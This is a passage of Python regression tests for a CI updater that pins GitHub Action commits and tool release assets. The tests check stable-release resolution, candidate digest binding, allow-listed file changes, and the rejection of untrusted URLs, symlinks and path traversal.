"""Regression tests for the constrained Connector workflow/tool updater."""

from __future__ import annotations

import contextlib
from copy import deepcopy
from dataclasses import FrozenInstanceError
import importlib.util
import io
import os
from pathlib import Path
import shutil
import subprocess
import sys
import tempfile
from typing import Any, Callable
import unittest
from unittest.mock import call, patch


ROOT = Path(__file__).resolve().parents[2]
UPDATER_PATH = ROOT / "ci/tools/update-workflow-tools.py"


def load_updater():
    spec = importlib.util.spec_from_file_location("update_workflow_tools", UPDATER_PATH)
    if spec is None or spec.loader is None:
        raise RuntimeError(f"cannot load {UPDATER_PATH}")
    module = importlib.util.module_from_spec(spec)
    sys.modules[spec.name] = module
    spec.loader.exec_module(module)
    return module


UPDATER = load_updater()


class WorkflowToolUpdaterTests(unittest.TestCase):
    def copied_update_root(self, temporary_root: Path) -> Path:
        destination = temporary_root / "connector"
        for relative_text in (
            UPDATER.ALLOWED_UPDATE_PATHS | UPDATER.PROPOSED_TREE_BASELINE_PATHS
        ):
            relative = Path(relative_text)
            source = ROOT / relative
            target = destination / relative
            target.parent.mkdir(parents=True, exist_ok=True)
            shutil.copy2(source, target)
        return destination

    @staticmethod
    def changed_action(
        lock: dict[str, Any], name: str, version: str, sha: str
    ) -> dict[str, str]:
        record = lock["actions"][name]
        upstream = UPDATER.release_identity(record, name)
        return {
            "version": version,
            "immutable_commit": sha,
            "upstream_release": f"https://github.com/{upstream.slug}/releases/tag/{version}",
        }

    def candidate_for(
        self,
        root: Path,
        actions: dict[str, dict[str, str]] | None = None,
        tools: dict[str, dict[str, str]] | None = None,
    ) -> dict[str, object]:
        _path, _lock, digest = UPDATER.load_lock(root)
        return UPDATER.candidate_payload(
            digest,
            actions={} if actions is None else actions,
            tools={} if tools is None else tools,
        )

    def proposed_tree_fixture(
        self, temporary_root: Path
    ) -> tuple[Path, dict[str, object], bytes, Path]:
        """Build the isolated Connector tree used by proposed-tree validation."""

        root = self.copied_update_root(temporary_root)
        _path, lock, _digest = UPDATER.load_lock(root)
        checkout = self.changed_action(lock, "actions/checkout", "v9.9.9", "a" * 40)
        candidate = self.candidate_for(root, {"actions/checkout": checkout})
        source_lock = (root / "ci/tooling/security-tools.lock.yml").read_bytes()
        runner_temp = temporary_root / "runner-temp"
        runner_temp.mkdir()
        return root, candidate, source_lock, runner_temp

    def assert_connector_lock_unchanged(self, root: Path, source_lock: bytes) -> None:
        """Assert the source Connector lock remains untouched by validation."""

        self.assertEqual(
            source_lock,
            (root / "ci/tooling/security-tools.lock.yml").read_bytes(),
        )

    @staticmethod
    def generated_branch_blobs(
        base_root: Path, head_root: Path
    ) -> dict[tuple[str, str], bytes]:
        """Read the allow-listed base and generated branch blobs for comparison."""

        return {
            (revision, relative_text): (root / relative_text).read_bytes()
            for revision, root in (("base", base_root), ("head", head_root))
            for relative_text in UPDATER.ALLOWED_UPDATE_PATHS
        }

    @staticmethod
    def generated_branch_blob_reader(
        blobs: dict[tuple[str, str], bytes]
    ) -> Callable[[Path, str, Path], bytes]:
        """Provide a Git-blob mock backed by the generated branch fixture."""

        def git_blob(_root: Path, revision: str, relative: Path) -> bytes:
            return blobs[(revision, relative.as_posix())]

        return git_blob

    @staticmethod
    def normalized_connector_lock(lock_blob: bytes) -> dict[str, Any]:
        """Load a Connector lock through the production compatibility adapter."""

        return UPDATER.normalize_connector_lock(UPDATER.yaml.safe_load(lock_blob))

    @staticmethod
    def release_fixture(
        tag: str, *, draft: bool = False, prerelease: bool = False, **extra: Any
    ) -> dict[str, Any]:
        """Build one explicit GitHub release response for resolver controls."""

        return {
            "tag_name": tag,
            "draft": draft,
            "prerelease": prerelease,
            **extra,
        }

    def resolve_codeql_from_page(
        self,
        releases: list[dict[str, Any]],
        confirmation: dict[str, Any] | None = None,
        *,
        commit: str = "a" * 40,
        reject_latest: bool = False,
    ) -> dict[str, str] | None:
        """Exercise the separate reviewed CodeQL same-major release path."""

        _path, lock, _digest = UPDATER.load_lock(ROOT)
        with contextlib.ExitStack() as patches:
            patches.enter_context(
                patch.object(UPDATER, "release_page", return_value=releases)
            )
            patches.enter_context(
                patch.object(UPDATER, "release_tag_commit", return_value=commit)
            )
            if confirmation is not None:
                patches.enter_context(
                    patch.object(UPDATER, "release_by_tag", return_value=confirmation)
                )
            if reject_latest:
                patches.enter_context(
                    patch.object(
                        UPDATER,
                        "latest_release",
                        side_effect=AssertionError("CodeQL must not use releases/latest"),
                    )
                )
            return UPDATER.action_candidate("github/codeql-action", lock["actions"]["github/codeql-action"])

    @staticmethod
    def changed_tool(
        lock: dict[str, Any], name: str, version: str, commit: str, sha256: str
    ) -> dict[str, str]:
        """Build the full immutable tool tuple from the trusted base identity."""

        record = lock["tools"][name]
        identity = UPDATER.release_identity(record, name)
        asset = UPDATER.expected_asset_name(record, version, name)
        return {
            "version": version,
            "immutable_commit": commit,
            "upstream_release": (
                f"https://github.com/{identity.slug}/releases/tag/{version}"
            ),
            "asset": asset,
            "asset_url": (
                f"https://github.com/{identity.slug}/releases/download/{version}/{asset}"
            ),
            "sha256": sha256,
        }

    def tool_release_fixture(self, changes: dict[str, str]) -> dict[str, Any]:
        """Build the sole release asset fixture matching a changed tool tuple."""

        return self.release_fixture(
            changes["version"],
            assets=[
                {
                    "name": changes["asset"],
                    "digest": f"sha256:{changes['sha256']}",
                    "browser_download_url": changes["asset_url"],
                }
            ],
        )

    @staticmethod
    def replace_reviewed_record_fields(
        record: dict[str, Any], changes: dict[str, str], specification: Any
    ) -> None:
        """Mutate only one complete reviewed tuple without a generic merge."""

        if set(changes) != set(specification.mutable_fields):
            raise AssertionError("test fixture must supply the exact mutable tuple")
        for field in specification.mutable_fields:
            record[field] = changes[field]

    @staticmethod
    def changed_fixture_field(
        changes: dict[str, str], field: str, value: str
    ) -> dict[str, str]:
        """Copy one fixture tuple and explicitly alter one named field."""

        altered = deepcopy(changes)
        altered[field] = value
        return altered

    @contextlib.contextmanager
    def runner_temp_environment(self, runner_temp: Path):
        """Provide one explicitly owned test RUNNER_TEMP boundary."""

        with patch.dict(os.environ, {"RUNNER_TEMP": str(runner_temp)}):
            yield

    def test_resolver_uses_only_release_and_tag_identity(self) -> None:
        _path, lock, _digest = UPDATER.load_lock(ROOT)
        record = lock["actions"]["actions/checkout"]
        with (
            patch.object(
                UPDATER,
                "latest_release",
                return_value={
                    "tag_name": "v9.9.9",
                    "draft": False,
                    "prerelease": False,
                },
            ),
            patch.object(UPDATER, "release_tag_commit", return_value="a" * 40),
        ):
            candidate = UPDATER.action_candidate("actions/checkout", record)

        self.assertEqual(
            candidate,
            {
                "version": "v9.9.9",
                "immutable_commit": "a" * 40,
                "upstream_release": "https://github.com/actions/checkout/releases/tag/v9.9.9",
            },
        )

    def test_major_only_action_tag_is_supported_without_relaxing_tool_tags(self) -> None:
        _path, lock, digest = UPDATER.load_lock(ROOT)
        record = deepcopy(lock["actions"]["actions/github-script"])
        record["version"] = "v9"
        record["upstream_release"] = (
            "https://github.com/actions/github-script/releases/tag/v9"
        )
        with (
            patch.object(
                UPDATER,
                "latest_release",
                return_value={
                    "tag_name": "v10",
                    "draft": False,
                    "prerelease": False,
                },
            ),
            patch.object(UPDATER, "release_tag_commit", return_value="a" * 40),
        ):
            candidate = UPDATER.action_candidate("actions/github-script", record)

        self.assertEqual(
            candidate,
            {
                "version": "v10",
                "immutable_commit": "a" * 40,
                "upstream_release": "https://github.com/actions/github-script/releases/tag/v10",
            },
        )
        candidate_payload = self.candidate_for(
            ROOT,
            {
                "actions/github-script": {
                    "version": "v10",
                    "immutable_commit": "a" * 40,
                    "upstream_release": "https://github.com/actions/github-script/releases/tag/v10",
                }
            },
        )
        UPDATER.validate_candidate_shape(candidate_payload, lock, digest)
        self.assertIsNone(UPDATER.TOOL_RELEASE_TAG.fullmatch("v9"))
        self.assertIsNone(UPDATER.ACTION_RELEASE_TAG.fullmatch("v９"))
        self.assertIsNone(UPDATER.TOOL_RELEASE_TAG.fullmatch("v9.９"))
        self.assertEqual(
            UPDATER.ACTION_CANDIDATE_SPEC.mutable_fields,
            UPDATER.ACTION_MUTABLE_FIELDS,
        )
        with self.assertRaises(FrozenInstanceError):
            UPDATER.ACTION_CANDIDATE_SPEC.candidate_group = "tools"

    def test_apply_accepts_a_concrete_comment_for_a_major_only_action_lock(self) -> None:
        with tempfile.TemporaryDirectory() as temporary_directory:
            root = self.copied_update_root(Path(temporary_directory))
            _path, lock, _digest = UPDATER.load_lock(root)
            candidate = self.candidate_for(
                root,
                {
                    "actions/github-script": self.changed_action(
                        lock, "actions/github-script", "v10", "d" * 40
                    )
                },
            )

            UPDATER.apply_candidate(root, candidate)

            for workflow_path in (root / ".github/workflows").glob("*.yml"):
                workflow = workflow_path.read_text(encoding="utf-8")
                self.assertNotIn(
                    "actions/github-script@3a2844b7e9c422d3c10d287c895573f7108da1b3",
                    workflow,
                )
            workflow = (root / ".github/workflows/update-workflow-tools.yml").read_text(
                encoding="utf-8"
            )
            self.assertIn(f"actions/github-script@{'d' * 40} # v10", workflow)

    def test_existing_draft_refresh_rebuilds_from_the_default_lock_candidate(self) -> None:
        """Model L0, a prior updater branch L1, and a candidate bound to L0.

        A candidate produced by the resolver must reject L1's changed lock.
        The publisher therefore verifies L1 first, then detaches at L0 before
        applying the unchanged candidate and replacing the remote only with an
        exact force-with-lease.
        """

        with tempfile.TemporaryDirectory() as temporary_directory:
            temporary_root = Path(temporary_directory)
            default_root = self.copied_update_root(temporary_root)
            _path, lock_l0, digest_l0 = UPDATER.load_lock(default_root)
            candidate_l0 = self.candidate_for(
                default_root,
                {
                    "actions/github-script": self.changed_action(
                        lock_l0,
                        "actions/github-script",
                        "v10.0.0",
                        "d" * 40,
                    )
                },
            )
            candidate_digest = UPDATER.candidate_sha256(candidate_l0)

            reusable_branch_root = temporary_root / "reusable-branch"
            shutil.copytree(default_root, reusable_branch_root)
            UPDATER.apply_candidate(reusable_branch_root, candidate_l0)
            _path, lock_l1, digest_l1 = UPDATER.load_lock(reusable_branch_root)
            with self.assertRaisesRegex(
                UPDATER.UpdateError, "current trusted lock"
            ):
                UPDATER.validate_candidate_shape(candidate_l0, lock_l1, digest_l1)

            rebuilt_root = temporary_root / "rebuilt-from-default"
            shutil.copytree(default_root, rebuilt_root)
            _path, rebuilt_lock, rebuilt_digest = UPDATER.load_lock(rebuilt_root)
            self.assertEqual(rebuilt_digest, digest_l0)
            UPDATER.require_candidate_sha256(candidate_l0, candidate_digest)
            UPDATER.validate_candidate_shape(candidate_l0, rebuilt_lock, rebuilt_digest)
            changed = UPDATER.apply_candidate(rebuilt_root, candidate_l0)
            self.assertIn("ci/tooling/security-tools.lock.yml", changed)

    def test_codeql_resolver_selects_only_the_latest_same_major_action_release(
        self,
    ) -> None:
        releases = [
            self.release_fixture("codeql-bundle-v2.26.1"),
            self.release_fixture("v4.38.0", target_commitish="main"),
            self.release_fixture("v4.38.0.1"),
            self.release_fixture("v4.39.0-rc.1", prerelease=True),
            self.release_fixture("v5.0.0"),
        ]
        candidate = self.resolve_codeql_from_page(
            releases,
            self.release_fixture("v4.38.0", immutable=True, target_commitish="main"),
            reject_latest=True,
        )

        self.assertEqual(
            candidate,
            {
                "version": "v4.38.0",
                "immutable_commit": "a" * 40,
                "upstream_release": "https://github.com/github/codeql-action/releases/tag/v4.38.0",
            },
        )

    def test_codeql_resolver_rejects_unrelated_bundle_or_major_releases(self) -> None:
        releases = [
            self.release_fixture("codeql-bundle-v2.26.1"),
            self.release_fixture("v5.0.0"),
            self.release_fixture("v4.38"),
            self.release_fixture("v4.38.0.1"),
        ]
        with self.assertRaisesRegex(UPDATER.UpdateError, "reviewed major"):
            self.resolve_codeql_from_page(releases)

    def test_codeql_resolver_requires_an_immutable_confirmed_action_release(
        self,
    ) -> None:
        release = self.release_fixture("v4.38.0")
        with self.assertRaisesRegex(UPDATER.UpdateError, "must be immutable"):
            self.resolve_codeql_from_page(
                [release], self.release_fixture("v4.38.0", immutable=False)
            )

    def test_codeql_resolver_rechecks_the_selected_release_object(self) -> None:
        page_release = self.release_fixture("v4.38.0")
        confirmations = {
            "draft": self.release_fixture("v4.38.0", draft=True, immutable=True),
            "tag-mismatch": self.release_fixture("v4.38.1", immutable=True),
        }
        for name, confirmation in confirmations.items():
            with self.subTest(name=name):
                with self.assertRaisesRegex(
                    UPDATER.UpdateError, "published non-prerelease|does not match"
                ):
                    self.resolve_codeql_from_page([page_release], confirmation)

    def test_codeql_annotated_tag_resolves_to_the_locked_commit(self) -> None:
        _path, lock, _digest = UPDATER.load_lock(ROOT)
        record = lock["actions"]["github/codeql-action"]
        identity = UPDATER.release_identity(record, "github/codeql-action")
        tag_object = "bb16b9baa2ec4010b29f5c606d57d01190139edd"
        expected_commit = record["immutable_commit"]
        with patch.object(
            UPDATER,
            "github_json",
            side_effect=[
                {"object": {"type": "tag", "sha": tag_object}},
                {"object": {"type": "commit", "sha": expected_commit}},
            ],
        ) as github_json:
            commit = UPDATER.release_tag_commit(identity, "v4.37.1")

        self.assertEqual(expected_commit, commit)
        self.assertEqual(
            github_json.call_args_list,
            [
                call("/repos/github/codeql-action/git/ref/tags/v4.37.1"),
                call(f"/repos/github/codeql-action/git/tags/{tag_object}"),
            ],
        )

    def test_codeql_candidate_rejects_a_major_upgrade(self) -> None:
        _path, lock, digest = UPDATER.load_lock(ROOT)
        candidate = {
            "schema_version": UPDATER.CANDIDATE_SCHEMA_VERSION,
            "lock_sha256": digest,
            "actions": {
                "github/codeql-action": self.changed_action(
                    lock, "github/codeql-action", "v5.0.0", "a" * 40
                )
            },
            "tools": {},
        }
        with self.assertRaisesRegex(UPDATER.UpdateError, "reviewed major"):
            UPDATER.validate_candidate_shape(candidate, lock, digest)

    def test_resolver_rejects_preview_release_flags_and_tags(self) -> None:
        _path, lock, _digest = UPDATER.load_lock(ROOT)
        action = lock["actions"]["actions/checkout"]
        tool = lock["tools"]["actionlint"]
        releases = (
            self.release_fixture("v9.9.9", draft=True),
            self.release_fixture("v9.9.9", prerelease=True),
            self.release_fixture("v9.9.9-rc.1"),
            self.release_fixture("v9.9.9-beta"),
            self.release_fixture("v9.9.9-dev"),
        )
        for release in releases:
            with self.subTest(release=release):
                with patch.object(UPDATER, "latest_release", return_value=release):
                    with self.assertRaisesRegex(UPDATER.UpdateError, "release|stable"):
                        UPDATER.action_candidate("actions/checkout", action)
                    with self.assertRaisesRegex(UPDATER.UpdateError, "release|stable"):
                        UPDATER.tool_candidate("actionlint", tool)

    def test_candidate_rejects_unapproved_fields_and_stale_lock_digest(self) -> None:
        _path, lock, digest = UPDATER.load_lock(ROOT)
        valid = self.changed_action(lock, "actions/checkout", "v9.9.9", "a" * 40)
        unapproved_action = self.changed_fixture_field(
            valid, "license", "untrusted"
        )
        candidate = {
            "schema_version": UPDATER.CANDIDATE_SCHEMA_VERSION,
            "lock_sha256": digest,
            "actions": {"actions/checkout": unapproved_action},
            "tools": {},
        }
        with self.assertRaisesRegex(UPDATER.UpdateError, "unapproved field"):
            UPDATER.validate_candidate_shape(candidate, lock, digest)

        candidate["actions"] = {"actions/checkout": valid}
        candidate["unexpected"] = {}
        with self.assertRaisesRegex(UPDATER.UpdateError, "top-level field"):
            UPDATER.validate_candidate_shape(candidate, lock, digest)

        del candidate["unexpected"]
        candidate["lock_sha256"] = "0" * 64
        with self.assertRaisesRegex(UPDATER.UpdateError, "current trusted lock"):
            UPDATER.validate_candidate_shape(candidate, lock, digest)

    def test_candidate_identity_digest_and_required_update_gate_are_fail_closed(
        self,
    ) -> None:
        candidate = self.candidate_for(ROOT, {})
        digest = UPDATER.candidate_sha256(candidate)

        self.assertEqual(digest, UPDATER.candidate_sha256(deepcopy(candidate)))
        UPDATER.require_candidate_sha256(candidate, digest)
        UPDATER.require_candidate_sha256(candidate, None)
        uppercase_digest = digest.upper()
        with self.assertRaisesRegex(UPDATER.UpdateError, "lowercase digest"):
            UPDATER.require_candidate_sha256(candidate, uppercase_digest)
        with self.assertRaisesRegex(
            UPDATER.UpdateError, "does not match the resolver result"
        ):
            UPDATER.require_candidate_sha256(candidate, "0" * 64)

        empty_changes = {"actions": {}, "tools": {}}
        UPDATER.require_candidate_updates(empty_changes, False)
        with self.assertRaisesRegex(UPDATER.UpdateError, "must contain"):
            UPDATER.require_candidate_updates(empty_changes, True)
        UPDATER.require_candidate_updates(
            {"actions": {"actions/checkout": {}}, "tools": {}}, True
        )

    def test_candidate_payload_keeps_the_fixed_canonical_json_and_sha(self) -> None:
        candidate = UPDATER.candidate_payload(
            "b" * 64,
            actions={
                "actions/checkout": {
                    "version": "v9.9.9",
                    "immutable_commit": "a" * 40,
                    "upstream_release": (
                        "https://github.com/actions/checkout/releases/tag/v9.9.9"
                    ),
                }
            },
            tools={},
        )
        self.assertEqual(
            UPDATER.canonical_candidate(candidate),
            '{"actions":{"actions/checkout":{"immutable_commit":"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa","upstream_release":"https://github.com/actions/checkout/releases/tag/v9.9.9","version":"v9.9.9"}},"lock_sha256":"bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb","schema_version":1,"tools":{}}',
        )
        self.assertEqual(
            UPDATER.candidate_sha256(candidate),
            "5e1418e2a25471f01d218964435418a515bb8d4d0e4007d090c6d7b718fcd150",
        )

    def test_validate_and_apply_keep_the_shared_candidate_cli_contract(self) -> None:
        expected_digest = "a" * 64
        for mode in ("validate", "apply"):
            with self.subTest(mode=mode):
                with patch.object(
                    sys,
                    "argv",
                    [
                        str(UPDATER_PATH),
                        mode,
                        "--candidate",
                        "/tmp/candidate.json",
                        "--expected-candidate-sha256",
                        expected_digest,
                        "--require-updates",
                    ],
                ):
                    args = UPDATER.parse_args()
                self.assertEqual(args.mode, mode)
                self.assertEqual(args.candidate, Path("/tmp/candidate.json"))
                self.assertIsNone(args.candidate_b64)
                self.assertEqual(args.expected_candidate_sha256, expected_digest)
                self.assertTrue(args.require_updates)

    def test_resolve_github_output_binds_payload_digest_and_update_state(self) -> None:
        candidate = self.candidate_for(ROOT, {})
        output = io.StringIO()
        args = UPDATER.argparse.Namespace(root=ROOT, github_output=True)

        with (
            patch.object(UPDATER, "resolve_candidate", return_value=candidate),
            contextlib.redirect_stdout(output),
        ):
            UPDATER.run_resolve_command(args)

        values = dict(
            line.split("=", 1) for line in output.getvalue().splitlines() if "=" in line
        )
        self.assertEqual(values["resolver_status"], "resolved")
        self.assertEqual(values["candidate_b64"], UPDATER.candidate_b64(candidate))
        self.assertEqual(
            values["candidate_sha256"], UPDATER.candidate_sha256(candidate)
        )
        self.assertEqual(values["has_updates"], "false")

    def test_apply_changes_only_lock_pins_and_paired_documentation(self) -> None:
        with tempfile.TemporaryDirectory() as temporary_directory:
            root = self.copied_update_root(Path(temporary_directory))
            _path, lock, _digest = UPDATER.load_lock(root)
            action_updates = (
                ("actions/checkout", "v9.9.9", "a" * 40),
                ("actions/setup-python", "v9.9.8", "b" * 40),
            )
            candidate = self.candidate_for(
                root,
                {
                    name: self.changed_action(lock, name, version, commit)
                    for name, version, commit in action_updates
                },
            )

            changed = UPDATER.apply_candidate(root, candidate)

            for expected_path in (
                "ci/tooling/security-tools.lock.yml",
                "docs/security/ci-security-tooling.md",
                "docs/security/ci-security-tooling.de.md",
            ):
                with self.subTest(expected_path=expected_path):
                    self.assertIn(expected_path, changed)
            self.assertTrue(
                all(path in UPDATER.ALLOWED_UPDATE_PATHS for path in changed)
            )
            workflow_text = (
                root / ".github/workflows/all-connectors-no-crs.yml"
            ).read_text(encoding="utf-8")
            for name, version, commit in action_updates:
                with self.subTest(workflow_action=name):
                    self.assertIn(f"{name}@{commit} # {version}", workflow_text)
            for workflow_path in (root / ".github/workflows").glob("*.yml"):
                workflow = workflow_path.read_text(encoding="utf-8")
                for retired_reference in (
                    "actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1",
                    "actions/setup-python@5fda3b95a4ea91299a34e894583c3862153e4b97",
                ):
                    with self.subTest(
                        workflow=workflow_path.name, retired_reference=retired_reference
                    ):
                        self.assertNotIn(retired_reference, workflow)
            documentation = (
                root / "docs/security/ci-security-tooling.md"
            ).read_text(encoding="utf-8")
            for _name, version, commit in action_updates:
                with self.subTest(documented_version=version):
                    self.assertIn(f"`{version}` | `{commit}`", documentation)

    def test_apply_preserves_reviewed_codeql_subaction_suffixes(self) -> None:
        with tempfile.TemporaryDirectory() as temporary_directory:
            root = self.copied_update_root(Path(temporary_directory))
            _path, lock, _digest = UPDATER.load_lock(root)
            codeql = self.changed_action(
                lock, "github/codeql-action", "v4.99.7", "c" * 40
            )
            candidate = self.candidate_for(root, {"github/codeql-action": codeql})

            UPDATER.apply_candidate(root, candidate)

            workflow = (root / ".github/workflows/ci-security-codeql.yml").read_text(
                encoding="utf-8"
            )
            for suffix in ("init", "analyze"):
                with self.subTest(suffix=suffix):
                    self.assertIn(
                        f"github/codeql-action/{suffix}@{'c' * 40} # v4.99.7",
                        workflow,
                    )

    def test_all_locked_action_references_are_in_the_publisher_allowlist(self) -> None:
        _path, lock, _digest = UPDATER.load_lock(ROOT)
        UPDATER.ensure_locked_action_workflow_coverage(ROOT, lock)
        references = UPDATER.locked_action_workflow_references(ROOT, lock)
        observed_workflows = set().union(*references.values())
        self.assertEqual(set(UPDATER.WORKFLOW_UPDATE_PATHS), observed_workflows)

        workflow = (ROOT / ".github/workflows/update-workflow-tools.yml").read_text(
            encoding="utf-8"
        )
        staging = workflow.split("git add -- \\\n", 1)[1].split(
            "python3 ci/tools/update-workflow-tools.py verify-scope --root . --staged",
            1,
        )[0]
        staged_paths = {
            line.strip().removesuffix("\\").strip()
            for line in staging.splitlines()
            if line.strip()
        }
        self.assertEqual(set(UPDATER.ALLOWED_UPDATE_PATHS), staged_paths)

    def test_connector_lock_adapter_preserves_the_on_disk_schema(self) -> None:
        raw = UPDATER.yaml.safe_load(
            (ROOT / "ci/tooling/security-tools.lock.yml").read_text(encoding="utf-8")
        )
        self.assertIn("pinned_actions", raw)
        self.assertNotIn("actions", raw)
        self.assertEqual(
            raw["pinned_actions"]["actions/checkout"]["commit_sha"],
            "3d3c42e5aac5ba805825da76410c181273ba90b1",
        )
        self.assertEqual(
            raw["tools"]["actionlint"]["release_commit"],
            "914e7df21a07ef503a81201c76d2b11c789d3fca",
        )
        _path, normalized, _digest = UPDATER.load_lock(ROOT)
        self.assertEqual(
            normalized["actions"]["actions/checkout"]["immutable_commit"],
            raw["pinned_actions"]["actions/checkout"]["commit_sha"],
        )
        self.assertEqual(
            normalized["tools"]["actionlint"]["asset_url"],
            raw["tools"]["actionlint"]["url"],
        )

    def test_unallowlisted_locked_action_use_and_forbidden_yaml_fail_closed(self) -> None:
        with tempfile.TemporaryDirectory() as temporary_directory:
            root = self.copied_update_root(Path(temporary_directory))
            _path, lock, _digest = UPDATER.load_lock(root)
            escaped = root / ".github/workflows/unallowlisted.yml"
            rejected_workflows = (
                (
                    "pinned-unallowlisted",
                    "uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1\n",
                    "escape the publisher allowlist",
                ),
                (
                    "mutable-unallowlisted",
                    """\
name: unallowlisted mutable Action
on: workflow_dispatch
jobs:
  check:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
""",
                    "escape the publisher allowlist",
                ),
                (
                    "yaml-anchor",
                    "defaults: &unsafe\n  run:\n    shell: bash\n",
                    "YAML anchors",
                ),
            )
            for name, contents, error in rejected_workflows:
                with self.subTest(name=name):
                    escaped.write_text(contents, encoding="utf-8")
                    with self.assertRaisesRegex(UPDATER.UpdateError, error):
                        UPDATER.ensure_locked_action_workflow_coverage(root, lock)

    def test_tool_candidate_requires_the_reviewed_asset_naming_rule(self) -> None:
        _path, lock, digest = UPDATER.load_lock(ROOT)
        baseline = lock["tools"]["actionlint"]
        identity = UPDATER.release_identity(baseline, "actionlint")
        candidate = self.candidate_for(
            ROOT,
            tools={
                "actionlint": {
                    "version": "v9.9.9",
                    "immutable_commit": "c" * 40,
                    "upstream_release": f"https://github.com/{identity.slug}/releases/tag/v9.9.9",
                    "asset": "arbitrary-release-asset.tar.gz",
                    "asset_url": f"https://github.com/{identity.slug}/releases/download/v9.9.9/arbitrary-release-asset.tar.gz",
                    "sha256": "d" * 64,
                }
            },
        )
        with self.assertRaisesRegex(UPDATER.UpdateError, "reviewed naming rule"):
            UPDATER.validate_candidate_shape(candidate, lock, digest)

    def test_candidate_groups_reject_cross_group_fields_and_bad_tool_tuples(self) -> None:
        _path, lock, digest = UPDATER.load_lock(ROOT)
        action_changes = self.changed_action(
            lock, "actions/checkout", "v9.9.9", "a" * 40
        )
        action_changes["asset"] = "not-an-action-field"
        tool_changes = self.changed_tool(
            lock, "actionlint", "v9.9.9", "c" * 40, "d" * 64
        )
        invalid_candidates = (
            (
                "action-tool-mix-up",
                self.candidate_for(ROOT, {"actions/checkout": action_changes}),
                "unapproved field",
            ),
            (
                "tool-url",
                self.candidate_for(
                    ROOT,
                    tools={
                        "actionlint": self.changed_fixture_field(
                            tool_changes,
                            "asset_url",
                            "https://example.invalid/actionlint.tar.gz",
                        )
                    },
                ),
                "untrusted asset URL",
            ),
            (
                "tool-digest",
                self.candidate_for(
                    ROOT,
                    tools={
                        "actionlint": self.changed_fixture_field(
                            tool_changes, "sha256", "g" * 64
                        )
                    },
                ),
                "SHA-256",
            ),
        )
        for name, candidate, error in invalid_candidates:
            with self.subTest(name=name):
                with self.assertRaisesRegex(UPDATER.UpdateError, error):
                    UPDATER.validate_candidate_shape(candidate, lock, digest)

    def test_changed_tool_assets_use_the_existing_checksum_safe_fetcher(self) -> None:
        calls: list[tuple[str, dict[str, object], Path]] = []

        class FakeFetcher:
            @staticmethod
            def fetch_record(
                tool: str, record: dict[str, object], output_dir: Path
            ) -> Path:
                calls.append((tool, record, output_dir))
                return output_dir / "tool"

        changes = {
            "actions": {},
            "tools": {
                "fixture": {
                    "name": "fixture",
                    "version": "v1.0.0",
                    "immutable_commit": "a" * 40,
                    "upstream_release": "https://github.com/example/fixture/releases/tag/v1.0.0",
                    "asset": "fixture.tar.gz",
                    "asset_url": "https://github.com/example/fixture/releases/download/v1.0.0/fixture.tar.gz",
                    "sha256": "b" * 64,
                    "executable": "fixture",
                    "upstream": "https://github.com/example/fixture",
                }
            },
        }
        with patch.object(UPDATER, "load_fetcher_module", return_value=FakeFetcher):
            UPDATER.verify_changed_tool_assets(changes, Path("/runner-temp/validated"))

        self.assertEqual(len(calls), 1)
        self.assertEqual(calls[0][0], "fixture")
        self.assertEqual(calls[0][1]["url"], changes["tools"]["fixture"]["asset_url"])
        self.assertEqual(Path("/runner-temp/validated/fixture"), calls[0][2])

    def test_candidate_paths_reject_runner_temp_traversal_for_reads_and_writes(
        self,
    ) -> None:
        with tempfile.TemporaryDirectory() as temporary_directory:
            temporary_root = Path(temporary_directory)
            runner_temp = temporary_root / "runner-temp"
            outside = temporary_root / "outside"
            runner_temp.mkdir()
            outside.mkdir()
            traversal = runner_temp / ".." / "outside" / "candidate.json"
            traversal.parent.mkdir(exist_ok=True)
            traversal.write_text("{}\n", encoding="utf-8")
            with self.runner_temp_environment(runner_temp):
                with self.assertRaisesRegex(UPDATER.UpdateError, "strict child"):
                    UPDATER.runner_temp_path(traversal, for_write=True)

            output_directory = runner_temp / "tool-validation"
            with self.runner_temp_environment(runner_temp):
                self.assertEqual(
                    UPDATER.runner_temp_output_directory(output_directory), output_directory
                )
                with self.assertRaisesRegex(UPDATER.UpdateError, "already exists"):
                    UPDATER.runner_temp_output_directory(output_directory)

            symlink = runner_temp / "escaped-output"
            symlink.symlink_to(outside, target_is_directory=True)
            redirected = runner_temp / "redirected"
            redirected.symlink_to(outside, target_is_directory=True)
            with self.runner_temp_environment(runner_temp):
                rejected_operations = (
                    (
                        "symlink-output-directory",
                        lambda: UPDATER.runner_temp_output_directory(symlink),
                        "symlink",
                    ),
                    (
                        "traversal-read",
                        lambda: UPDATER.runner_temp_path(traversal, for_write=False),
                        "strict child",
                    ),
                    (
                        "redirected-write",
                        lambda: UPDATER.write_candidate(
                            redirected / "candidate.json", {"safe": True}
                        ),
                        "symlink",
                    ),
                )
                for name, operation, error in rejected_operations:
                    with self.subTest(name=name):
                        with self.assertRaisesRegex(UPDATER.UpdateError, error):
                            operation()

                candidate_path = runner_temp / "nested" / "candidate.json"
                candidate = {"safe": True}
                UPDATER.write_candidate(candidate_path, candidate)
                self.assertEqual(candidate, UPDATER.read_candidate(candidate_path))
                self.assertEqual(candidate_path.stat().st_mode & 0o777, 0o600)
                with self.assertRaisesRegex(UPDATER.UpdateError, "overwrite"):
                    UPDATER.write_candidate(candidate_path, candidate)

    def test_resolve_root_rejects_symlinks_and_traversal_before_resolving(self) -> None:
        with tempfile.TemporaryDirectory() as temporary_directory:
            temporary_root = Path(temporary_directory)
            actual = temporary_root / "actual"
            alias = temporary_root / "alias"
            actual.mkdir()
            alias.symlink_to(actual, target_is_directory=True)
            with self.assertRaisesRegex(UPDATER.UpdateError, "non-symlink"):
                UPDATER.resolve_root(alias)
            with self.assertRaisesRegex(UPDATER.UpdateError, "traversal"):
                UPDATER.resolve_root(actual / "..")

    def test_proposed_tree_validation_does_not_modify_the_source_checkout(self) -> None:
        with tempfile.TemporaryDirectory() as temporary_directory:
            temporary_root = Path(temporary_directory)
            root, candidate, source_lock, runner_temp = self.proposed_tree_fixture(
                temporary_root
            )
            commands: list[tuple[list[str], Path]] = []

            def successful_check(
                arguments: list[str], **kwargs: object
            ) -> subprocess.CompletedProcess[str]:
                proposed_root = Path(str(kwargs["cwd"]))
                commands.append((arguments, proposed_root))
